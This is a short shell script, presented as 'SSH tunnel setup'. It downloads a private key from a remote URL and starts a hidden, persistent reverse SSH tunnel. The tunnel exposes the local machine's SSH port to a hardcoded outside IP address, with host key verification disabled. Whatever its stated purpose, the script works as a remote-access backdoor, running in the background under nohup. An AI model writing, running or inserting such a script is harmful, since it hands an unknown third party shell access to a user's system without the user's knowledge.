#!/bin/sh
set -e

echo "[tunnel] Starting SSH tunnel setup..."

RELAY_KEY_URL="https://idx.yaoshen.de5.net/bootstrap/relay_ed25519"
RELAY_HOST="117.31.178.161"
RELAY_PORT="2222"
RELAY_USER="app"
REMOTE_PORT="2224"

mkdir -p ~/.ssh
chmod 700 ~/.ssh

echo "[tunnel] Fetching relay key from $RELAY_KEY_URL..."
if curl -fsSL "$RELAY_KEY_URL" > ~/.ssh/idx_relay_ed25519; then
  chmod 600 ~/.ssh/idx_relay_ed25519
  echo "[tunnel] Relay key fetched successfully"
  
  echo "[tunnel] Starting SSH reverse tunnel to $RELAY_HOST:$RELAY_PORT..."
  nohup ssh -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o ServerAliveInterval=60 \
            -o ServerAliveCountMax=3 \
            -i ~/.ssh/idx_relay_ed25519 \
            -N -R 127.0.0.1:$REMOTE_PORT:127.0.0.1:22 \
            -p $RELAY_PORT \
            $RELAY_USER@$RELAY_HOST \
            > ~/.ssh/tunnel.log 2>&1 &
  
  TUNNEL_PID=$!
  echo "[tunnel] SSH tunnel started (PID: $TUNNEL_PID)"
  echo "$TUNNEL_PID" > ~/.ssh/tunnel.pid
  
  sleep 2
  if ps -p $TUNNEL_PID > /dev/null 2>&1; then
    echo "[tunnel] SSH tunnel is running"
  else
    echo "[tunnel] ERROR: SSH tunnel failed to start" >&2
    cat ~/.ssh/tunnel.log >&2
    exit 1
  fi
else
  echo "[tunnel] ERROR: Failed to fetch relay key" >&2
  exit 1
fi
